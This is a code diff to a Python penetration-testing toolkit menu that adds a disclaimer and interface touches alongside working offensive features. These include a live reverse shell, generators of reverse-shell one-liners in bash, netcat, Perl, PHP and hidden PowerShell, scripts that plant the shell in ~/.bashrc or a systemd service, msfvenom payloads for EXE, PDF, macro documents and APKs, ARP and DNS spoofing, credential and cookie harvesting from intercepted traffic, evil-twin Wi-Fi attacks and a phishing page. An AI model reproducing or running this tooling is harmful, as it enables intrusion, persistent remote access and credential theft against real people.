@@ -29,6 +29,39 @@ class Colors:
 def cprint(text, color):
     print(f"{color}{text}{Colors.ENDC}")
 
+def animated_print(text, delay=0.03):
+    for line in text.splitlines():
+        print(line)
+        time.sleep(delay)
+
+def typewriter(text, delay=0.01):
+    for char in text:
+        print(char, end='', flush=True)
+        time.sleep(delay)
+    print()
+
+class Spinner:
+    def __init__(self, message="Working..."):
+        self.spinner = ['|', '/', '-', '\\']
+        self.idx = 0
+        self.running = False
+        self.thread = None
+        self.message = message
+    def start(self):
+        self.running = True
+        def spin():
+            while self.running:
+                print(f"\r{self.message} {self.spinner[self.idx % len(self.spinner)]}", end='', flush=True)
+                self.idx += 1
+                time.sleep(0.1)
+        self.thread = threading.Thread(target=spin)
+        self.thread.start()
+    def stop(self):
+        self.running = False
+        if self.thread:
+            self.thread.join()
+        print("\r" + " " * (len(self.message) + 4) + "\r", end='')
+
 BANNER = f"""
 {Colors.OKCYAN}
 ██████╗ ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗  ██╗
@@ -43,7 +76,22 @@ BANNER = f"""
          GitHub: https://github.com/astra-incognito/
 """
 
-print(BANNER + Colors.ENDC)
+# Add a prominent disclaimer under the logo
+DISCLAIMER = f"""
+{Colors.WARNING}{Colors.BOLD}DISCLAIMER:{Colors.ENDC}{Colors.WARNING}
+This toolkit is for educational and authorized penetration testing use only.
+Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical.
+By using this toolkit, you agree to comply with all applicable laws and regulations.
+The author assumes no liability for misuse or damage caused by this software.
+{Colors.ENDC}
+"""
+
+# Animated logo/banner reveal
+animated_print(BANNER, delay=0.03)
+
+# Typewriter effect for disclaimer
+print()
+typewriter(DISCLAIMER, delay=0.01)
 
 if sys.platform != "linux" and sys.platform != "linux2":
     print("[!] This toolkit is only supported on Linux.")
@@ -132,7 +180,10 @@ def nmap_scan(target):
     ensure_installed("nmap", "nmap")
     print(f"\n[+] Running Nmap scan on {target}")
     options = input("Nmap options (default -A): ").strip() or "-A"
+    spinner = Spinner("Scanning with Nmap")
+    spinner.start()
     result = subprocess.run(["nmap"] + options.split() + [target], capture_output=True, text=True)
+    spinner.stop()
     print(result.stdout)
     # Highlight open ports
     open_ports = []
@@ -229,15 +280,15 @@ def phishing_page():
         title = input("Page title: ")
         prompt = input("Prompt text (e.g. Enter your password): ")
         html = f"""
-        <html><head><title>{title}</title></head>
-        <body>
-        <h2>{prompt}</h2>
-        <form method='POST' action='steal.php'>
-            <input name='user' placeholder='Username'><br>
-            <input name='pass' type='password' placeholder='Password'><br>
-            <input type='submit'>
-        </form></body></html>
-        """
+<html><head><title>{title}</title></head>
+<body>
+<h2>{prompt}</h2>
+<form method='POST' action='steal.php'>
+    <input name='user' placeholder='Username'><br>
+    <input name='pass' type='password' placeholder='Password'><br>
+    <input type='submit'>
+</form></body></html>
+"""
     with open(os.path.join(folder, "index.html"), "w") as f:
         f.write(html)
     print(f"[+] Phishing page saved to ./{folder}/index.html")
@@ -577,124 +628,412 @@ def wifi_wifite():
     print("[+] Launching Wifite (automated WiFi attack tool)...")
     subprocess.run(["sudo", "wifite"])
 
-# Split menu into core and advanced
-core_menu = """
-1. ARP Scan
-2. Port Scan
-3. Whois Lookup
-4. HTTP Headers
-5. Crack SHA256 Hash
-6. DNS Lookup
-7. SSL Certificate Info
-8. Subdomain Finder
-9. Directory Bruteforce
-10. CVE Search
-99. More Tools
-0. Exit
-"""
+def reverse_shell():
+    print("[!] WARNING: Use the reverse shell only for authorized, ethical testing.")
+    ip = input("Connect back to IP: ").strip()
+    port = input("Port: ").strip()
+    try:
+        port = int(port)
+    except ValueError:
+        print("[-] Invalid port number.")
+        return
+    print(f"[+] Launching reverse shell to {ip}:{port} ...")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        import pty
+        pty.spawn("/bin/bash")
+    except Exception as e:
+        print(f"[-] Reverse shell failed: {e}")
 
-more_menu = """
-11. Gobuster Dir Scan
-12. Nmap Full Scan
-13. Hydra Login Bruteforce
-14. SQLMap Injection Scan
-15. Social Engineering Toolkit (SET)
-16. Fake Email Spoof (local test)
-17. Phishing Page Generator
-18. OSINT Wordlist Generator
-19. WiFi Network Scan
-20. Capture WPA Handshake
-21. Crack WPA Handshake
-22. Automated WiFi Attack (Wifite)
-0. Back
-"""
-
-# Print core menu with color
-def print_core_menu():
-    cprint(core_menu, Colors.OKBLUE)
-# Print more menu with color
-def print_more_menu():
-    cprint(more_menu, Colors.OKCYAN)
-
-print_core_menu()
-
-showing_more = False
-while True:
-    if not showing_more:
-        choice = input("Select Option > ")
+def generate_reverse_shell_payload():
+    print("[!] Generate reverse shell payload for use on a target.")
+    ip = input("Attacker IP (your IP): ").strip()
+    port = input("Port to connect back to: ").strip()
+    try:
+        port = int(port)
+    except ValueError:
+        print("[-] Invalid port number.")
+        return
+    print("Select payload type:")
+    print("1. Python (default)")
+    print("2. Bash")
+    print("3. Netcat")
+    print("4. Perl")
+    print("5. PHP")
+    print("6. PowerShell (Windows)")
+    ptype = input("Payload type [1-6]: ").strip() or "1"
+    if ptype == "2":
+        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+    elif ptype == "3":
+        payload = f"nc -e /bin/bash {ip} {port}"
+    elif ptype == "4":
+        payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'"
+    elif ptype == "5":
+        payload = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
+    elif ptype == "6":
+        payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
     else:
-        choice = input("[More Tools] Select Option > ")
-    if not showing_more:
+        payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
+    print("\n[+] Copy and run this on the target:")
+    print(payload)
+    save = input("Save as script file? (y/N): ").strip().lower() == 'y'
+    if save:
+        fname = input("Filename (default: revshell.txt): ").strip() or "revshell.txt"
+        with open(fname, "w") as f:
+            f.write(payload + "\n")
+        print(f"[+] Script saved as {fname}")
+
+def generate_persistence_script():
+    print("[!] Generate a Linux persistence script for a reverse shell.")
+    ip = input("Attacker IP (your IP): ").strip()
+    port = input("Port to connect back to: ").strip()
+    try:
+        port = int(port)
+    except ValueError:
+        print("[-] Invalid port number.")
+        return
+    print("Select persistence method:")
+    print("1. Add to ~/.bashrc (default)")
+    print("2. Add to ~/.profile")
+    print("3. Create systemd service (root)")
+    method = input("Method [1-3]: ").strip() or "1"
+    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+    if method == "2":
+        script = f'echo "{payload}" >> ~/.profile'
+    elif method == "3":
+        script = f'''echo -e '[Unit]\nDescription=Reverse Shell\n[Service]\nType=simple\nExecStart=/bin/bash -c \"{payload}\"\n[Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/revshell.service > /dev/null
+sudo systemctl daemon-reload
+sudo systemctl enable revshell.service
+sudo systemctl start revshell.service'''
+    else:
+        script = f'echo "{payload}" >> ~/.bashrc'
+    print("\n[+] Run this on the target for persistence:")
+    print(script)
+    save = input("Save as script file? (y/N): ").strip().lower() == 'y'
+    if save:
+        fname = input("Filename (default: persistence.sh): ").strip() or "persistence.sh"
+        with open(fname, "w") as f:
+            f.write(script + "\n")
+        print(f"[+] Script saved as {fname}")
+
+def start_listener():
+    print("[!] Start a Netcat (nc) listener to catch reverse shells.")
+    port = input("Port to listen on: ").strip()
+    try:
+        port = int(port)
+    except ValueError:
+        print("[-] Invalid port number.")
+        return
+    print(f"[+] To listen for a reverse shell, run this command in your terminal:")
+    print(f"nc -lvnp {port}")
+    # Optionally, try to launch nc automatically if available
+    if shutil.which("nc"):
+        auto = input("Launch listener now? (y/N): ").strip().lower() == 'y'
+        if auto:
+            print(f"[+] Starting listener on port {port} (press Ctrl+C to stop)...")
+            try:
+                subprocess.run(["nc", "-lvnp", str(port)])
+            except KeyboardInterrupt:
+                print("[!] Listener stopped.")
+
+def generate_msfvenom_payload():
+    print("[!] Automated msfvenom payload generator (requires Metasploit installed)")
+    print("Select payload type:")
+    print("1. Windows EXE (.exe)")
+    print("2. PDF (.pdf, requires vulnerable reader)")
+    print("3. Word DOCX (.docx, macro, requires user to enable macros)")
+    print("4. Android APK (.apk)")
+    ptype = input("Payload type [1-4]: ").strip()
+    lhost = input("LHOST (your IP): ").strip()
+    lport = input("LPORT (your port): ").strip()
+    output = input("Output filename (e.g. shell.exe): ").strip()
+    if not lhost or not lport or not output:
+        print("[-] LHOST, LPORT, and output filename are required.")
+        return
+    if ptype == "1":
+        payload = "windows/shell_reverse_tcp"
+        fmt = "exe"
+    elif ptype == "2":
+        payload = "windows/meterpreter/reverse_tcp"
+        fmt = "pdf"
+    elif ptype == "3":
+        payload = "windows/meterpreter/reverse_tcp"
+        fmt = "raw"
+    elif ptype == "4":
+        payload = "android/meterpreter/reverse_tcp"
+        fmt = "apk"
+    else:
+        print("[-] Invalid payload type.")
+        return
+    print(f"[+] Generating payload with msfvenom...")
+    if ptype == "3":
+        macro_file = output if output.endswith(".txt") else output + ".txt"
+        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", macro_file]
+        print(f"[!] For DOCX, you must embed the macro from {macro_file} into a Word document manually.")
+    else:
+        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", output]
+    spinner = Spinner("Generating payload")
+    spinner.start()
+    try:
+        subprocess.run(cmd, check=True)
+    except Exception as e:
+        spinner.stop()
+        print(f"[-] msfvenom failed: {e}")
+        return
+    spinner.stop()
+    print(f"[+] Payload generated: {output if ptype != '3' else macro_file}")
+    if ptype == "2":
+        print("[!] PDF payloads require a vulnerable PDF reader to be effective.")
+    if ptype == "3":
+        print("[!] Embed the macro into a Word document and instruct the user to enable macros.")
+    if ptype == "4":
+        print("[!] APK payloads require installation and permissions on the target device.")
+
+def mitm_menu():
+    print("""
+[Advanced MITM Attacks]
+1. ARP Spoofing (arpspoof)
+2. HTTP/HTTPS Sniffing & Credential Harvesting (mitmproxy)
+3. DNS Spoofing (dnsspoof)
+0. Back
+""")
+    while True:
+        choice = input("[MITM] Select Option > ").strip()
         if choice == "1":
-            arp_scan()
+            arp_spoof()
         elif choice == "2":
-            ip = input("Target IP: ")
-            port_scan(ip)
+            http_sniff_and_harvest()
         elif choice == "3":
-            domain = input("Domain: ")
-            whois_lookup(domain)
-        elif choice == "4":
-            url = input("URL (http/https): ")
-            headers_grabber(url)
-        elif choice == "5":
-            h = input("SHA256 hash: ")
-            crack_hash(h)
-        elif choice == "6":
-            domain = input("Domain: ")
-            dns_lookup(domain)
-        elif choice == "7":
-            domain = input("Domain (no http): ")
-            ssl_info(domain)
-        elif choice == "8":
-            domain = input("Domain: ")
-            find_subdomains(domain)
-        elif choice == "9":
-            base = input("Base URL (http/https): ")
-            dir_bruteforce(base)
-        elif choice == "10":
-            keyword = input("Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): ")
-            cve_lookup(keyword)
-        elif choice == "99":
-            print_more_menu()
-            showing_more = True
+            dns_spoof()
         elif choice == "0":
-            print("Exiting...")
             break
         else:
             print("Invalid option.")
-    else:
-        if choice == "11":
-            target_url = input("Target URL (http/https): ")
-            gobuster_scan(target_url)
-        elif choice == "12":
-            target = input("Target for Nmap: ")
-            nmap_scan(target)
-        elif choice == "13":
-            ip = input("Target IP: ")
-            user = input("Username: ")
-            service = input("Service (e.g. ssh, ftp): ")
-            hydra_scan(ip, user, service)
-        elif choice == "14":
-            url = input("URL vulnerable to SQLi: ")
-            sqlmap_scan(url)
-        elif choice == "15":
-            setoolkit()
-        elif choice == "16":
-            spoof_email()
-        elif choice == "17":
-            phishing_page()
-        elif choice == "18":
-            osint_wordlist_generator()
-        elif choice == "19":
-            wifi_scan()
-        elif choice == "20":
-            wifi_handshake_capture()
-        elif choice == "21":
-            wifi_crack_handshake()
-        elif choice == "22":
-            wifi_wifite()
+
+def log_mitm_result(data):
+    with open("results_mitm.txt", "a") as f:
+        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}\n")
+
+def http_sniff_and_harvest():
+    ensure_installed("mitmproxy", "mitmproxy")
+    iface = input("Network interface (e.g. eth0): ").strip()
+    port = input("Proxy port (default 8080): ").strip() or "8080"
+    print("[!] You may need to set up iptables to redirect traffic to the proxy port.")
+    print("[!] mitmproxy will log HTTP POST data and cookies for credential/session harvesting.")
+    print(f"[+] Starting mitmproxy on {iface}:{port} (press q to quit)...")
+    print("[!] After stopping mitmproxy, credentials and session tokens will be parsed and saved to results_mitm.txt.")
+    flows_file = "mitmproxy_flows.log"
+    try:
+        subprocess.run(["mitmproxy", "-i", iface, "-p", port, "-w", flows_file])
+    except Exception as e:
+        print(f"[-] mitmproxy failed: {e}")
+        return
+    # Try to parse mitmproxy flows for credentials and session tokens
+    try:
+        try:
+            import mitmproxy.io
+            from mitmproxy import http
+        except ImportError:
+            print("[-] mitmproxy Python module not installed. Skipping parsing. You can install it with: pip install mitmproxy")
+            return
+        found = []
+        with open(flows_file, "rb") as logfile:
+            freader = mitmproxy.io.FlowReader(logfile)
+            for flow in freader.stream():
+                if isinstance(flow, http.HTTPFlow):
+                    # Credential harvesting: look for POST data
+                    if flow.request.method == "POST":
+                        post_data = flow.request.get_text()
+                        if any(k in post_data.lower() for k in ["pass", "user", "login", "pwd", "email"]):
+                            entry = f"[CRED] {flow.request.host}{flow.request.path} | {post_data}"
+                            print(entry)
+                            log_mitm_result(entry)
+                            found.append(entry)
+                    # Session hijacking: look for cookies
+                    cookies = flow.request.cookies.fields
+                    if cookies:
+                        entry = f"[COOKIE] {flow.request.host}{flow.request.path} | {cookies}"
+                        print(entry)
+                        log_mitm_result(entry)
+                        found.append(entry)
+        if not found:
+            print("[!] No credentials or session tokens found in flows.")
+        else:
+            print(f"[+] {len(found)} credentials/session tokens harvested. See results_mitm.txt.")
+    except Exception as e:
+        print(f"[-] Error parsing mitmproxy flows: {e}")
+
+def arp_spoof():
+    ensure_installed("arpspoof", "dsniff")
+    iface = input("Network interface (e.g. eth0): ").strip()
+    target = input("Target IP (victim): ").strip()
+    gateway = input("Gateway IP (router): ").strip()
+    print("[!] You may need to enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1")
+    print(f"[+] Running: sudo arpspoof -i {iface} -t {target} {gateway}")
+    try:
+        subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", target, gateway])
+    except Exception as e:
+        print(f"[-] arpspoof failed: {e}")
+
+def dns_spoof():
+    ensure_installed("dnsspoof", "dsniff")
+    iface = input("Network interface (e.g. eth0): ").strip()
+    hosts_file = input("Hosts file (e.g. /tmp/dnshosts): ").strip()
+    print(f"[+] Running: sudo dnsspoof -i {iface} -f {hosts_file}")
+    try:
+        subprocess.run(["sudo", "dnsspoof", "-i", iface, "-f", hosts_file])
+    except Exception as e:
+        print(f"[-] dnsspoof failed: {e}")
+
+def wifi_mitm_menu():
+    print("""
+[WiFi MITM Attacks]
+1. Evil Twin AP (airbase-ng)
+2. Deauth + Rogue AP (airbase-ng + deauth)
+3. Automated Phishing Portal (wifiphisher)
+0. Back
+""")
+    while True:
+        choice = input("[WiFi MITM] Select Option > ").strip()
+        if choice == "1":
+            evil_twin_ap()
+        elif choice == "2":
+            deauth_rogue_ap()
+        elif choice == "3":
+            wifiphisher_attack()
         elif choice == "0":
-            print_core_menu()
-            showing_more = False
+            break
         else:
             print("Invalid option.")
+
+def log_wifi_mitm_result(data):
+    with open("results_wifi_mitm.txt", "a") as f:
+        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}\n")
+
+def evil_twin_ap():
+    ensure_installed("airbase-ng", "aircrack-ng")
+    iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
+    ssid = input("SSID to clone (target network name): ").strip()
+    channel = input("Channel (default 6): ").strip() or "6"
+    print("[!] This will create a fake AP with the same SSID. Clients may connect if deauthed from the real AP.")
+    print(f"[+] Running: sudo airbase-ng -e '{ssid}' -c {channel} {iface}")
+    log_wifi_mitm_result(f"Evil Twin AP started: SSID={ssid}, channel={channel}, iface={iface}")
+    print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface created by airbase-ng.")
+    print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
+    print("[!] After capturing, use Wireshark's 'Follow TCP Stream' and search for login/password fields.")
+    try:
+        subprocess.run(["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface])
+    except Exception as e:
+        print(f"[-] airbase-ng failed: {e}")
+
+def deauth_rogue_ap():
+    ensure_installed("airbase-ng", "aircrack-ng")
+    iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
+    ssid = input("SSID to clone (target network name): ").strip()
+    channel = input("Channel (default 6): ").strip() or "6"
+    bssid = input("Target BSSID (AP MAC): ").strip()
+    client = input("Target client MAC (leave blank for broadcast): ").strip()
+    print("[!] First, deauth clients from the real AP...")
+    if client:
+        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client, iface])
+    else:
+        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, iface])
+    print("[+] Now starting Evil Twin AP...")
+    log_wifi_mitm_result(f"Deauth+Rogue AP: SSID={ssid}, channel={channel}, iface={iface}, bssid={bssid}, client={client if client else 'broadcast'}")
+    print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface created by airbase-ng.")
+    print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
+    print("[!] After capturing, use Wireshark's 'Follow TCP Stream' and search for login/password fields.")
+    try:
+        subprocess.run(["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface])
+    except Exception as e:
+        print(f"[-] airbase-ng failed: {e}")
+
+def wifiphisher_attack():
+    ensure_installed("wifiphisher", "wifiphisher")
+    print("[!] Wifiphisher automates WiFi MITM, phishing, and captive portal attacks.")
+    print("[+] Launching Wifiphisher (requires root, monitor mode)...")
+    log_wifi_mitm_result("Wifiphisher attack started.")
+    print("[!] Wifiphisher saves captured credentials and phishing results in its output directory (shown in the tool).")
+    try:
+        subprocess.run(["sudo", "wifiphisher"])
+    except Exception as e:
+        print(f"[-] wifiphisher failed: {e}")
+
+# Split menu into core and advanced
+core_menus = [
+    [
+        ("1. ARP Scan", lambda: arp_scan()),
+        ("2. Port Scan", lambda: port_scan(input("Target IP: "))),
+        ("3. Whois Lookup", lambda: whois_lookup(input("Domain: "))),
+        ("4. HTTP Headers", lambda: headers_grabber(input("URL (http/https): "))),
+        ("5. Crack SHA256 Hash", lambda: crack_hash(input("SHA256 hash: "))),
+        ("6. DNS Lookup", lambda: dns_lookup(input("Domain: "))),
+        ("7. SSL Certificate Info", lambda: ssl_info(input("Domain (no http): "))),
+        ("8. Subdomain Finder", lambda: find_subdomains(input("Domain: "))),
+        ("9. Directory Bruteforce", lambda: dir_bruteforce(input("Base URL (http/https): "))),
+        ("10. CVE Search", lambda: cve_lookup(input("Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): "))),
+        ("99. Next Page", None),
+        ("0. Exit", None)
+    ],
+    [
+        ("11. Gobuster Dir Scan", lambda: gobuster_scan(input("Target URL (http/https): "))),
+        ("12. Nmap Full Scan", lambda: nmap_scan(input("Target for Nmap: "))),
+        ("13. Hydra Login Bruteforce", lambda: hydra_scan(input("Target IP: "), input("Username: "), input("Service (e.g. ssh, ftp): "))),
+        ("14. SQLMap Injection Scan", lambda: sqlmap_scan(input("URL vulnerable to SQLi: "))),
+        ("15. Social Engineering Toolkit (SET)", setoolkit),
+        ("16. Fake Email Spoof (local test)", spoof_email),
+        ("17. Phishing Page Generator", phishing_page),
+        ("18. OSINT Wordlist Generator", osint_wordlist_generator),
+        ("19. WiFi Network Scan", wifi_scan),
+        ("20. Capture WPA Handshake", wifi_handshake_capture),
+        ("99. Next Page", None),
+        ("0. Back", None)
+    ],
+    [
+        ("21. Crack WPA Handshake", wifi_crack_handshake),
+        ("22. Automated WiFi Attack (Wifite)", wifi_wifite),
+        ("23. Reverse Shell (TCP)", reverse_shell),
+        ("24. Generate Reverse Shell Payload", generate_reverse_shell_payload),
+        ("25. Start Listener (Netcat)", start_listener),
+        ("26. Generate Persistence Script", generate_persistence_script),
+        ("27. Generate msfvenom Payload", generate_msfvenom_payload),
+        ("28. Advanced MITM Attacks", mitm_menu),
+        ("29. WiFi MITM Attacks", wifi_mitm_menu),
+        ("0. Back", None)
+    ]
+]
+
+def print_core_menu(page):
+    cprint("\n" + "\n".join([item[0] for item in core_menus[page]]) + "\n", Colors.OKBLUE)
+
+current_page = 0
+while True:
+    print_core_menu(current_page)
+    choice = input("Select Option > ").strip()
+    menu = core_menus[current_page]
+    found = False
+    for idx, (label, action) in enumerate(menu):
+        num = label.split(".")[0]
+        if choice == num:
+            found = True
+            if label.endswith("Exit"):
+                print("Exiting...")
+                exit()
+            elif label.endswith("Back"):
+                current_page = max(0, current_page - 1)
+                break
+            elif label.endswith("Next Page"):
+                if current_page < len(core_menus) - 1:
+                    current_page += 1
+                else:
+                    print("[!] No more pages.")
+                break
+            elif action:
+                action()
+                break
+    if not found:
+        print("Invalid option.")
